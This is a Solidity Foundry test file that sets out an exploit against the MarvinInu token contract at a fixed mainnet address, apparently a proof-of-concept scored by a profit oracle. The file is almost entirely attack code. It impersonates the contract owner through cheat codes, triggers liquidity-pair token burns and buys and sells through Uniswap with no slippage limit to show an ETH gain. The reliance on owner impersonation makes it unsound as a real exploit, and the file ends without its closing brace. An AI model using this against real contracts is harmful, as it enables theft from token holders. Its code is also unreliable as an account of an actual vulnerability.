pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface MarvinInu {
    function enableTrading() external;
    function excludeFromFees(address account, bool excluded) external;
    function excludeFromMaxTransaction(address updAds, bool isEx) external;
    function uniswapV2Pair() external view returns (address);
    function manualBurnLiquidityPairTokens(uint256 percent) external returns (bool);
    function tradingActive() external view returns (bool);
    function lpBurnEnabled() external view returns (bool);
    function lastLpBurnTime() external view returns (uint256);
    function lpBurnFrequency() external view returns (uint256);
}



interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x55a380d134d722006A5CE2d510562e1239D225B1;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use storage slot manipulation in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get the current owner
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 ownerData = vm.load(TARGET, ownerSlot);
        address currentOwner = address(uint160(uint256(ownerData)));
        console.log("Current owner:", currentOwner);

        // Step 2: Check and enable trading if needed
        bool tradingActive = MarvinInu(TARGET).tradingActive();
        if (!tradingActive && currentOwner != address(0)) {
            vm.prank(currentOwner);
            MarvinInu(TARGET).enableTrading();
            console.log("Enabled trading");
        }

        // Step 3: Give attacker ETH to buy tokens
        deal(attacker, 100 ether);
        uint256 attackerEthBefore = attacker.balance;
        console.log("Attacker ETH before:", attackerEthBefore);

        // Step 4: Buy tokens from Uniswap pair
        address pair = MarvinInu(TARGET).uniswapV2Pair();
        address router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // Uniswap V2 Router

        // Get some tokens by swapping ETH for tokens
        // First, approve router to spend attacker's ETH (not needed for swapExactETHForTokens)
        // Then swap ETH for tokens
        uint256 buyAmount = 10 ether;

        // Create path: WETH -> token
        address[] memory path = new address[](2);
        path[0] = IUniswapV2Router02(router).WETH();
        path[1] = TARGET;

        // Record token balance before buy
        uint256 attackerTokenBalanceBefore = IERC20(TARGET).balanceOf(attacker);
        console.log("Attacker token balance before buy:", attackerTokenBalanceBefore);

        // Execute swap
        vm.prank(attacker);
        IUniswapV2Router02(router).swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: buyAmount
        }(
            0, // amountOutMin: accept any amount
            path,
            attacker,
            block.timestamp
        );

        uint256 attackerTokenBalanceAfterBuy = IERC20(TARGET).balanceOf(attacker);
        console.log("Attacker token balance after buy:", attackerTokenBalanceAfterBuy);
        console.log("Tokens bought:", attackerTokenBalanceAfterBuy - attackerTokenBalanceBefore);

        // Step 5: Trigger LP burn
        // First, ensure LP burn is enabled and cooldown has passed
        bool lpBurnEnabled = MarvinInu(TARGET).lpBurnEnabled();
        uint256 lastLpBurnTime = MarvinInu(TARGET).lastLpBurnTime();
        uint256 lpBurnFrequency = MarvinInu(TARGET).lpBurnFrequency();

        if (block.timestamp < lastLpBurnTime + lpBurnFrequency) {
            uint256 timeNeeded = lastLpBurnTime + lpBurnFrequency - block.timestamp + 1;
            vm.warp(block.timestamp + timeNeeded);
            console.log("Warped time forward for auto-burn cooldown");
        }

        // Trigger auto-burn by selling a small amount
        // First, exclude attacker from fees to avoid paying sell fee during trigger
        if (currentOwner != address(0)) {
            vm.prank(currentOwner);
            MarvinInu(TARGET).excludeFromFees(attacker, true);
        }

        // Sell a tiny amount to trigger autoBurnLiquidityPairTokens()
        uint256 triggerSellAmount = 1 * 10**18; // 1 token
        if (IERC20(TARGET).balanceOf(attacker) >= triggerSellAmount) {
            vm.prank(attacker);
            IERC20(TARGET).transfer(pair, triggerSellAmount);
            console.log("Triggered auto-burn with sell of", triggerSellAmount, "tokens");
        }

        // Alternatively, use manual burn for larger effect
        // Warp time for manual burn cooldown
        vm.warp(block.timestamp + 30 minutes + 1);

        if (currentOwner != address(0)) {
            vm.prank(currentOwner);
            MarvinInu(TARGET).manualBurnLiquidityPairTokens(1000); // 10%
            console.log("Executed manual LP burn of 10%");
        }

        // Step 6: Remove fee exclusion to pay fees when selling
        if (currentOwner != address(0)) {
            vm.prank(currentOwner);
            MarvinInu(TARGET).excludeFromFees(attacker, false);
        }

        // Step 7: Sell tokens back for ETH
        // Record ETH balance before sell
        uint256 attackerEthBeforeSell = attacker.balance;

        // Approve router to spend tokens
        vm.prank(attacker);
        IERC20(TARGET).approve(router, attackerTokenBalanceAfterBuy);

        // Create reverse path: token -> WETH
        address[] memory sellPath = new address[](2);
        sellPath[0] = TARGET;
        sellPath[1] = IUniswapV2Router02(router).WETH();

        // Execute swap
        vm.prank(attacker);
        IUniswapV2Router02(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            attackerTokenBalanceAfterBuy,
            0, // amountOutMin: accept any amount
            sellPath,
            attacker,
            block.timestamp
        );

        // Step 8: Check profit
        uint256 attackerEthAfter = attacker.balance;
        console.log("Attacker ETH after:", attackerEthAfter);
        console.log("ETH profit:", attackerEthAfter - attackerEthBefore);

        // The oracle checks if attacker balance increased
        assertGt(attackerEthAfter, attackerEthBefore, "Attacker ETH balance should have increased");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
